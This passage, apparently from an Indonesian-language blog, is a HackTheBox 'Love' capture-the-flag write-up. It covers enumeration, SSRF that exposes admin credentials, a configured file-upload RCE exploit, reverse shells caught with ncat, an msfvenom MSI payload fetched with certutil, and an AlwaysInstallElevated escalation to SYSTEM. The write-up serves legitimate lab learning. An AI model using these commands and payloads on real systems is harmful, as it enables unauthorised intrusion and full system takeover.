<span class="o">|</span><span class="n">_clock</span><span class="o">-</span><span class="n">skew</span><span class="o">:</span> <span class="n">mean</span><span class="o">:</span> <span class="mi">2</span><span class="n">h05m58s</span><span class="p">,</span> <span class="n">deviation</span><span class="o">:</span> <span class="mi">3</span><span class="n">h30m01s</span><span class="p">,</span> <span class="n">median</span><span class="o">:</span> <span class="mi">20</span><span class="n">m57s</span>
<span class="o">|</span> <span class="n">p2p</span><span class="o">-</span><span class="n">conficker</span><span class="o">:</span> 
<span class="o">|</span>   <span class="n">Checking</span> <span class="k">for</span> <span class="n">Conficker</span><span class="p">.</span><span class="n">C</span> <span class="n">or</span> <span class="n">higher</span><span class="p">...</span>
<span class="o">|</span>   <span class="n">Check</span> <span class="mi">1</span> <span class="p">(</span><span class="n">port</span> <span class="mi">29716</span><span class="o">/</span><span class="n">tcp</span><span class="p">)</span><span class="o">:</span> <span class="n">CLEAN</span> <span class="p">(</span><span class="n">Couldn</span><span class="err">'</span><span class="n">t</span> <span class="n">connect</span><span class="p">)</span>
<span class="o">|</span>   <span class="n">Check</span> <span class="mi">2</span> <span class="p">(</span><span class="n">port</span> <span class="mi">46453</span><span class="o">/</span><span class="n">tcp</span><span class="p">)</span><span class="o">:</span> <span class="n">CLEAN</span> <span class="p">(</span><span class="n">Couldn</span><span class="err">'</span><span class="n">t</span> <span class="n">connect</span><span class="p">)</span>
<span class="o">|</span>   <span class="n">Check</span> <span class="mi">3</span> <span class="p">(</span><span class="n">port</span> <span class="mi">44577</span><span class="o">/</span><span class="n">udp</span><span class="p">)</span><span class="o">:</span> <span class="n">CLEAN</span> <span class="p">(</span><span class="n">Failed</span> <span class="n">to</span> <span class="n">receive</span> <span class="n">data</span><span class="p">)</span>
<span class="o">|</span>   <span class="n">Check</span> <span class="mi">4</span> <span class="p">(</span><span class="n">port</span> <span class="mi">21885</span><span class="o">/</span><span class="n">udp</span><span class="p">)</span><span class="o">:</span> <span class="n">CLEAN</span> <span class="p">(</span><span class="n">Timeout</span><span class="p">)</span>
<span class="o">|</span><span class="n">_</span>  <span class="mi">0</span><span class="o">/</span><span class="mi">4</span> <span class="n">checks</span> <span class="n">are</span> <span class="n">positive</span><span class="o">:</span> <span class="n">Host</span> <span class="n">is</span> <span class="n">CLEAN</span> <span class="n">or</span> <span class="n">ports</span> <span class="n">are</span> <span class="n">blocked</span>
<span class="o">|</span> <span class="n">smb</span><span class="o">-</span><span class="n">os</span><span class="o">-</span><span class="n">discovery</span><span class="o">:</span> 
<span class="o">|</span>   <span class="n">OS</span><span class="o">:</span> <span class="n">Windows</span> <span class="mi">10</span> <span class="n">Pro</span> <span class="mi">19042</span> <span class="p">(</span><span class="n">Windows</span> <span class="mi">10</span> <span class="n">Pro</span> <span class="mf">6.3</span><span class="p">)</span>
<span class="o">|</span>   <span class="n">OS</span> <span class="n">CPE</span><span class="o">:</span> <span class="n">cpe</span><span class="o">:/</span><span class="n">o</span><span class="o">:</span><span class="n">microsoft</span><span class="o">:</span><span class="n">windows_10</span><span class="o">::-</span>
<span class="o">|</span>   <span class="n">Computer</span> <span class="n">name</span><span class="o">:</span> <span class="n">Love</span>
<span class="o">|</span>   <span class="n">NetBIOS</span> <span class="n">computer</span> <span class="n">name</span><span class="o">:</span> <span class="n">LOVE</span><span class="err">\</span><span class="n">x00</span>
<span class="o">|</span>   <span class="n">Workgroup</span><span class="o">:</span> <span class="n">WORKGROUP</span><span class="err">\</span><span class="n">x00</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">System</span> <span class="n">time</span><span class="o">:</span> <span class="mi">2021</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">09</span><span class="n">T08</span><span class="o">:</span><span class="mi">11</span><span class="o">:</span><span class="mi">22</span><span class="o">-</span><span class="mo">07</span><span class="o">:</span><span class="mo">00</span>
<span class="o">|</span> <span class="n">smb</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">mode</span><span class="o">:</span> 
<span class="o">|</span>   <span class="n">account_used</span><span class="o">:</span> <span class="o">&lt;</span><span class="n">blank</span><span class="o">&gt;</span>
<span class="o">|</span>   <span class="n">authentication_level</span><span class="o">:</span> <span class="n">user</span>
<span class="o">|</span>   <span class="n">challenge_response</span><span class="o">:</span> <span class="n">supported</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">message_signing</span><span class="o">:</span> <span class="n">disabled</span> <span class="p">(</span><span class="n">dangerous</span><span class="p">,</span> <span class="n">but</span> <span class="k">default</span><span class="p">)</span>
<span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">mode</span><span class="o">:</span> 
<span class="o">|</span>   <span class="mf">2.02</span><span class="o">:</span> 
<span class="o">|</span><span class="n">_</span>    <span class="n">Message</span> <span class="n">signing</span> <span class="n">enabled</span> <span class="n">but</span> <span class="n">not</span> <span class="n">required</span>
<span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">time</span><span class="o">:</span> 
<span class="o">|</span>   <span class="n">date</span><span class="o">:</span> <span class="mi">2021</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">09</span><span class="n">T15</span><span class="o">:</span><span class="mi">11</span><span class="o">:</span><span class="mi">23</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">start_date</span><span class="o">:</span> <span class="n">N</span><span class="o">/</span><span class="n">A</span>

</code></pre></div></div>
<p>too many hasil yang diberikan. kurang lebih jika saya rangkum:</p>
<ul>
  <li>HTTP/HTTPS pada 80, 443, 5000.</li>
  <li>SMB/RPC pada 135/139/445.</li>
  <li>MySQL pada 3306.</li>
  <li>Unknown services pada 5040 dan 7680</li>
</ul>

<h2 id="smb">SMB - TCP 445</h2>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">arin</span><span class="err">@</span><span class="n">aoba</span> <span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">Love</span> <span class="err">$</span> <span class="n">smbmap</span> <span class="o">-</span><span class="n">H</span> <span class="mf">10.10.10.239</span> <span class="o">-</span><span class="n">u</span> <span class="n">sharpicx</span> <span class="o">-</span><span class="n">p</span> <span class="n">sharpicx</span>
<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="n">Authentication</span> <span class="n">error</span> <span class="n">on</span> <span class="mf">10.10.10.239</span>
<span class="n">arin</span><span class="err">@</span><span class="n">aoba</span> <span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">Love</span> <span class="err">$</span> <span class="n">smbclient</span>  <span class="o">-</span><span class="n">N</span> <span class="o">-</span><span class="n">L</span> <span class="c1">//10.10.10.239               </span>
<span class="n">smbclient</span><span class="o">:</span> <span class="n">Can</span><span class="err">'</span><span class="n">t</span> <span class="n">load</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">samba</span><span class="o">/</span><span class="n">smb</span><span class="p">.</span><span class="n">conf</span> <span class="o">-</span> <span class="n">run</span> <span class="n">testparm</span> <span class="n">to</span> <span class="n">debug</span> <span class="n">it</span>
<span class="n">session</span> <span class="n">setup</span> <span class="n">failed</span><span class="o">:</span> <span class="n">NT_STATUS_ACCESS_DENIED</span>
</code></pre></div></div>

<h2 id="mysql">MySQL - TCP 3306</h2>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">arin</span><span class="err">@</span><span class="n">aoba</span> <span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">Love</span> <span class="err">$</span> <span class="n">mysql</span> <span class="o">-</span><span class="n">h</span> <span class="mf">10.10.10.239</span>
<span class="n">ERROR</span> <span class="mi">1130</span> <span class="p">(</span><span class="n">HY000</span><span class="p">)</span><span class="o">:</span> <span class="n">Host</span> <span class="err">'</span><span class="mf">10.10.14.126</span><span class="err">'</span> <span class="n">is</span> <span class="n">not</span> <span class="n">allowed</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span> <span class="k">this</span> <span class="n">MariaDB</span> <span class="n">server</span>
</code></pre></div></div>

<h2 id="unknown-services---tcp-5080-dan-7680">Unknown services - TCP 5080 dan 7680</h2>
<p><img src="https://i.postimg.cc/L4nNT3mv/image.png" alt="tidakkasdkz" /><br />
tidak ada yang berguna.</p>

<h2 id="http443">HTTP - TCP 443 and 5000</h2>
<p><img src="https://i.postimg.cc/7LJZ9RQw/image.png" alt="asf" /></p>

<h2 id="http80">HTTP - TCP 80</h2>
<p><img src="https://i.postimg.cc/hPYr7W9r/image.png" alt="gambarasdas" /></p>

<p>saya memasukkan default username / ID pada setiap login system seperti ini biasanya sih â€œadminâ€.
tapi tetap saja error yang diberikan tetap sama saja.</p>

<p><img src="https://i.postimg.cc/sXy9R5WQ/image.png" alt="keasd" /><br />
lupakan saja karena percuma jika diurusin terus menerus dan tidak melangkah maju.</p>

<p>karena judul yang sangat menarik perhatian â€œVoting Systemâ€, membuat saya ingin mencari sesuatu pada <em>searchsploit</em>.</p>
<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">arin@aoba</span> <span class="p">~</span> <span class="err">$</span> <span class="n">searchsploit</span> <span class="s">"voting system"</span>
<span class="p">--------------------------------------------------------</span> <span class="p">---------------------------------</span>
 <span class="n">Exploit</span> <span class="n">Title</span>                                          <span class="p">|</span>  <span class="n">Path</span>
<span class="p">--------------------------------------------------------</span> <span class="p">---------------------------------</span>
<span class="n">Online</span> <span class="n">Voting</span> <span class="n">System</span> <span class="p">-</span> <span class="n">Authentication</span> <span class="n">Bypass</span>            <span class="p">|</span> <span class="n">php</span><span class="p">/</span><span class="n">webapps</span><span class="p">/</span><span class="m">43967.</span><span class="n">py</span>
<span class="n">Online</span> <span class="n">Voting</span> <span class="n">System</span> <span class="n">Project</span> <span class="k">in</span> <span class="n">PHP</span> <span class="p">-</span> <span class="err">'</span><span class="n">username</span><span class="err">'</span> <span class="n">Persis</span> <span class="p">|</span> <span class="n">multiple</span><span class="p">/</span><span class="n">webapps</span><span class="p">/</span><span class="m">49159.</span><span class="n">txt</span>
<span class="n">Voting</span> <span class="n">System</span> <span class="m">1.0</span> <span class="p">-</span> <span class="n">Authentication</span> <span class="nf">Bypass</span> <span class="p">(</span><span class="n">SQLI</span><span class="p">)</span>        <span class="p">|</span> <span class="n">php</span><span class="p">/</span><span class="n">webapps</span><span class="p">/</span><span class="m">49843.</span><span class="n">txt</span>
<span class="n">Voting</span> <span class="n">System</span> <span class="m">1.0</span> <span class="p">-</span> <span class="n">File</span> <span class="n">Upload</span> <span class="nf">RCE</span> <span class="p">(</span><span class="n">Authenticated</span> <span class="n">Remo</span> <span class="p">|</span> <span class="n">php</span><span class="p">/</span><span class="n">webapps</span><span class="p">/</span><span class="m">49445.</span><span class="n">py</span>
<span class="n">Voting</span> <span class="n">System</span> <span class="m">1.0</span> <span class="p">-</span> <span class="n">Remote</span> <span class="n">Code</span> <span class="nf">Execution</span> <span class="p">(</span><span class="n">Unauthentica</span> <span class="p">|</span> <span class="n">php</span><span class="p">/</span><span class="n">webapps</span><span class="p">/</span><span class="m">49846.</span><span class="n">txt</span>
<span class="n">Voting</span> <span class="n">System</span> <span class="m">1.0</span> <span class="p">-</span> <span class="n">Time</span> <span class="n">based</span> <span class="nf">SQLI</span>  <span class="p">(</span><span class="n">Unauthenticated</span> <span class="n">S</span> <span class="p">|</span> <span class="n">php</span><span class="p">/</span><span class="n">webapps</span><span class="p">/</span><span class="m">49817.</span><span class="n">txt</span>
<span class="p">--------------------------------------------------------</span> <span class="p">---------------------------------</span>
<span class="n">Shellcodes</span><span class="p">:</span> <span class="n">No</span> <span class="n">Results</span>
<span class="n">arin@aoba</span> <span class="p">~</span> <span class="err">$</span> 
</code></pre></div></div>
<p>mungkin setelah beberapa step kita akan mencoba beberapa dari exploit diatas.</p>

<h2 id="bruteforcing-web-directories">bruteforcing web directories.</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[11:13:06] Starting: 
[11:13:09] 301 -  330B  - /images  -&gt;  http://love.htb/images/
[11:13:11] 301 -  330B  - /Images  -&gt;  http://love.htb/Images/
[11:13:12] 301 -  329B  - /admin  -&gt;  http://love.htb/admin/
[11:13:16] 301 -  331B  - /plugins  -&gt;  http://love.htb/plugins/
[11:13:17] 301 -  332B  - /includes  -&gt;  http://love.htb/includes/
[11:13:23] 503 -  398B  - /examples
[11:13:29] 301 -  328B  - /dist  -&gt;  http://love.htb/dist/
[11:13:33] 403 -  417B  - /licenses
[11:14:00] 301 -  330B  - /IMAGES  -&gt;  http://love.htb/IMAGES/
[11:14:01] 403 -  298B  - /%20
</code></pre></div></div>
<p>sesuatu yang menarik ketika meng-bruteforce. yaitu pada <strong>/admin</strong>. dan yang asik adalah
mencoba hal yang sama ketika berhadapan dengan login page, yaitu memasukkan setiap username default â€œadminâ€ dan melihat MessageBox yang ditampilkan.
<br />
<img src="https://i.postimg.cc/wvGXRZPJ/image.png" alt="damn" /><br />
perbandingan dengan memasukkan username yang lain.<br />
<img src="https://i.postimg.cc/nzHRGy0P/image.png" alt="asd" /><br />
okay we almost done.</p>

<h2 id="staging">staging.love.htb - 80</h2>

<p><img src="https://i.postimg.cc/xd9h6Nd5/image.png" alt="tigaempat" /></p>

<p>desain yang sangat friendly, nav bar â€œDemoâ€ diatas mengarah pada url <strong>/beta.php</strong>.</p>

<p><img src="https://i.postimg.cc/3x3QccS2/image.png" alt="limaenam" /><br />
pada dasarnya web ini adalah demonstrasi dari file scanner yang dimana menyuruh kita untuk meletakkan suatu URL file. Tapi kali ini beda kita akan buat local server <code class="language-plaintext highlighter-rouge">python3 -m http.server 7000</code>, dan memasukkan IP kita pada kolom textbox. response yang didapat.</p>

<p><img src="https://i.postimg.cc/MpfVg9nK/image.png" alt="kek" /></p>

<p>haha, directory listing. oka we got it.</p>

<h2 id="phoebe">Shell as phoebe</h2>
<h2 id="SSRF">SSRF</h2>
<p>Karna tadi saya mendapat respon yang lumayan membuka kesempatan bermanfaat untuk melangkah maju. berarti yang saya hadapi adalah Server-Side Request Forgery (SSRF) exploit. kali ini saya akan mencoba meletakkan URL localhost dan menambahkan port 5000 yang dimana pada saat recon port tersebut tidak memiliki tugas apapun, barangkali itu adalah POST untuk menyimpan suatu identitas atau credentials dari pemilik website, probably.</p>

<p><code class="language-plaintext highlighter-rouge">http://127.0.0.1:5000</code><br />
<img src="https://i.postimg.cc/hv430kPG/image.png" alt="asdasd" /></p>

<h2 id="RCE">RCE</h2>
<p><code class="language-plaintext highlighter-rouge">searchsploit -m php/webapps/49445.py</code><br /></p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># --- Edit your settings here ----
</span><span class="n">IP</span> <span class="o">=</span> <span class="s">"love.htb"</span> <span class="c1"># Website's URL
</span><span class="n">USERNAME</span> <span class="o">=</span> <span class="s">"admin"</span> <span class="c1">#Auth username
</span><span class="n">PASSWORD</span> <span class="o">=</span> <span class="s">"@LoveIsInTheAir!!!!"</span> <span class="c1"># Auth Password
</span><span class="n">REV_IP</span> <span class="o">=</span> <span class="s">"10.10.14.126"</span> <span class="c1"># Reverse shell IP
</span><span class="n">REV_PORT</span> <span class="o">=</span> <span class="s">"1337"</span> <span class="c1"># Reverse port 
# --------------------------------
</span></code></pre></div></div>
<p>setelah mengunduh exploit saya mengubah konfigurasi dan memperbaiki beberapa error pada kode python. sebenarnya cuma ngilangin <strong>/votesystem</strong> doang agar exploit berjalan lancar.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">INDEX_PAGE</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">IP</span><span class="si">}</span><span class="s">/admin/index.php"</span>
<span class="n">LOGIN_URL</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">IP</span><span class="si">}</span><span class="s">/admin/login.php"</span>
<span class="n">VOTE_URL</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">IP</span><span class="si">}</span><span class="s">/admin/voters_add.php"</span>
<span class="n">CALL_SHELL</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">IP</span><span class="si">}</span><span class="s">/images/shell.php"</span>
</code></pre></div></div>
<p>nyalakan <strong>ncat</strong> untuk listening port. dan yap.</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">arin</span><span class="err">@</span><span class="nx">aoba</span><span class="w"> </span><span class="nx">~/Desktop/htb/Love</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="nx">ncat</span><span class="w"> </span><span class="nt">-nvlp</span><span class="w"> </span><span class="nx">1337</span><span class="w">
</span><span class="n">Ncat:</span><span class="w"> </span><span class="nx">Version</span><span class="w"> </span><span class="nx">7.92</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">https://nmap.org/ncat</span><span class="w"> </span><span class="p">)</span><span class="w">
</span><span class="n">Ncat:</span><span class="w"> </span><span class="nx">Listening</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="p">:::</span><span class="nx">1337</span><span class="w">
</span><span class="n">Ncat:</span><span class="w"> </span><span class="nx">Listening</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">0.0.0.0:1337</span><span class="w">
</span><span class="n">Ncat:</span><span class="w"> </span><span class="nx">Connection</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">10.10.10.239.</span><span class="w">
</span><span class="n">Ncat:</span><span class="w"> </span><span class="nx">Connection</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">10.10.10.239:52521.</span><span class="w">
</span><span class="n">b374k</span><span class="w"> </span><span class="nx">shell</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">connected</span><span class="w">

</span><span class="n">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="p">[</span><span class="n">Version</span><span class="w"> </span><span class="mf">10.0</span><span class="o">.</span><span class="nf">19042</span><span class="o">.</span><span class="nf">867</span><span class="p">]</span><span class="w">
</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="mi">2020</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="nx">Corporation.</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nx">rights</span><span class="w"> </span><span class="nx">reserved.</span><span class="w">

</span><span class="n">C:\xampp\htdocs\omrs\images</span><span class="err">&gt;</span><span class="nx">cd</span><span class="w"> </span><span class="nx">Users\Phoebe\Desktop</span><span class="w">

</span><span class="n">C:\Users\Phoebe\Desktop</span><span class="err">&gt;</span><span class="nx">type</span><span class="w"> </span><span class="nx">user.txt</span><span class="w">
</span><span class="kr">type</span><span class="w"> </span><span class="n">user.txt</span><span class="w">
</span><span class="nx">deb6400895844694210ebdce77ff5457</span><span class="w">

</span></code></pre></div></div>

<h2 id="privesc">Privilege Escalation</h2>

<p><a href="https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/">https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/</a>
thanks for the awesome articles dude!</p>

<p>setelah banyak cara saya lakukan untuk meng-ekskalasi, dan tidak juga menemukannya. finally i got another way alias bukan another sih memang itâ€™s too common to say another. pengecekan untuk <strong>AlwaysInstalledElevated</strong> ternyata sudah aktif.</p>
<div class="language-ps highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">C:\Users\Phoebe\Desktop</span><span class="p">&gt;</span><span class="nf">reg</span> <span class="nf">query</span> <span class="nf">HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</span> <span class="nv">/v</span> <span class="nf">AlwaysInstallElevated</span>
<span class="nf">reg</span> <span class="nf">query</span> <span class="nf">HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</span>  <span class="nv">/v</span> <span class="nf">AlwaysInstallElevated</span>

<span class="nf">HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer</span>
    <span class="nf">AlwaysInstallElevated</span>    <span class="nf">REG_DWORD</span>    <span class="nf">0x1</span>

</code></pre></div></div>
<p>0x1 yang berarti aktif dengan nilai dword / REG_WORD. haha. apa maksudnya? dimana Microsoft Windows Installer / Packages yang non-administrator secara langsung menggunakan elevated permissions (memerlukan izin yang tinggi) untuk instalasi sebauh program pada system. so basically itâ€™s too directly to gain the access.</p>

<p>mari kita buka <strong>msfvenom</strong>.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">arin</span><span class="err">@</span><span class="n">aoba</span> <span class="o">~</span> <span class="err">$</span> <span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">windows</span><span class="o">/</span><span class="n">shell_reverse_tcp</span> <span class="n">LHOST</span><span class="o">=</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">14</span><span class="p">.</span><span class="mi">126</span> <span class="n">LPORT</span><span class="o">=</span><span class="mi">8080</span> <span class="o">-</span><span class="n">f</span> <span class="n">msi</span> <span class="o">-</span><span class="n">o</span> <span class="n">sharpicx</span><span class="p">.</span><span class="n">msi</span>
</code></pre></div></div>
<p>lalu set up python HTTP Server dengan port 7000 pada local machine untuk diunggah menggunakan <strong>cerutil</strong>.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">C:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Phoebe</span><span class="err">\</span><span class="n">Desktop</span><span class="o">&gt;</span><span class="n">certutil</span> <span class="o">-</span><span class="n">urlcache</span> <span class="o">-</span><span class="n">split</span> <span class="o">-</span><span class="n">f</span> <span class="n">http</span><span class="o">:</span><span class="c1">//10.10.14.126:7000/sharpicx.msi</span>
<span class="n">certutil</span> <span class="o">-</span><span class="n">urlcache</span> <span class="o">-</span><span class="n">split</span> <span class="o">-</span><span class="n">f</span> <span class="n">http</span><span class="o">:</span><span class="c1">//10.10.14.126:7000/sharpicx.msi</span>
<span class="o">****</span>  <span class="n">Online</span>  <span class="o">****</span>
  <span class="mo">000000</span>  <span class="p">...</span>
  <span class="mo">027000</span>
<span class="n">CertUtil</span><span class="o">:</span> <span class="o">-</span><span class="n">URLCache</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="p">.</span>
</code></pre></div></div>
<p>setelah selesai mari kita jalankan file berformat <em>msi</em> ini dengan <strong>ncat</strong> listener.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">C:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Phoebe</span><span class="err">\</span><span class="n">Desktop</span><span class="o">&gt;</span><span class="p">.</span><span class="err">\</span><span class="n">sharpicx</span><span class="p">.</span><span class="n">msi</span>
<span class="p">.</span><span class="err">\</span><span class="n">sharpicx</span><span class="p">.</span><span class="n">msi</span>

<span class="o">-----------------</span>

<span class="n">arin</span><span class="err">@</span><span class="n">aoba</span> <span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">Love</span> <span class="err">$</span> <span class="n">ncat</span> <span class="o">-</span><span class="n">nvlp</span> <span class="mi">8080</span><span class="n">Ncat</span><span class="o">:</span> <span class="n">Version</span> <span class="mi">7</span><span class="p">.</span><span class="mi">92</span> <span class="p">(</span> <span class="n">https</span><span class="o">:</span><span class="c1">//nmap.org/ncat )</span>
<span class="n">Ncat</span><span class="o">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="o">:::</span><span class="mi">8080</span>
<span class="n">Ncat</span><span class="o">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="o">:</span><span class="mi">8080</span>
<span class="n">Ncat</span><span class="o">:</span> <span class="n">Connection</span> <span class="n">from</span> <span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">239</span><span class="p">.</span>
<span class="n">Ncat</span><span class="o">:</span> <span class="n">Connection</span> <span class="n">from</span> <span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">239</span><span class="o">:</span><span class="mi">50904</span><span class="p">.</span>
<span class="n">Microsoft</span> <span class="n">Windows</span> <span class="p">[</span><span class="n">Version</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">19042</span><span class="p">.</span><span class="mi">867</span><span class="p">]</span>
<span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="mi">2020</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="p">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="p">.</span>

<span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">WINDOWS</span><span class="err">\</span><span class="n">system32</span><span class="o">&gt;</span><span class="n">whoami</span>
<span class="n">whoami</span>
<span class="n">nt</span> <span class="n">authority</span><span class="err">\</span><span class="n">system</span>

<span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">WINDOWS</span><span class="err">\</span><span class="n">system32</span><span class="o">&gt;</span><span class="n">type</span> <span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Administrator</span><span class="err">\</span><span class="n">Desktop</span><span class="err">\</span><span class="n">root</span><span class="p">.</span><span class="n">txt</span>
<span class="n">type</span> <span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Administrator</span><span class="err">\</span><span class="n">Desktop</span><span class="err">\</span><span class="n">root</span><span class="p">.</span><span class="n">txt</span>
<span class="mi">807</span><span class="n">b1309e0311e6077684eef6b94e21d</span>

</code></pre></div></div>
<p>Okay iâ€™m done with this.</p>]]></content><author><name></name></author><category term="hackthebox" /><category term="SSRF" /><category term="burp" /><category term="upload" /><category term="msfvenom" /><category term="MSI" /><category term="Windows" /><category term="RCE" /><summary type="html"><![CDATA[Love adalah machine yang dirilis dengan sistem operasi Windows dengan tingkat kesulitan Easy. menggunakan SSRF untuk mendapatkan akses terhadap Webpage yang hanya diizinkan untuk diperlihatkan oleh localhost credentials. lalu meng-exploit sebuah vulnerability upload dalam Voting System untuk mendapatkan Remote Code Execution (RCE). berkat Enumeration, akhirnya AlwaysInstallElevated setting bisa didapatkan untuk mendapatkan system shell.]]></summary></entry></feed>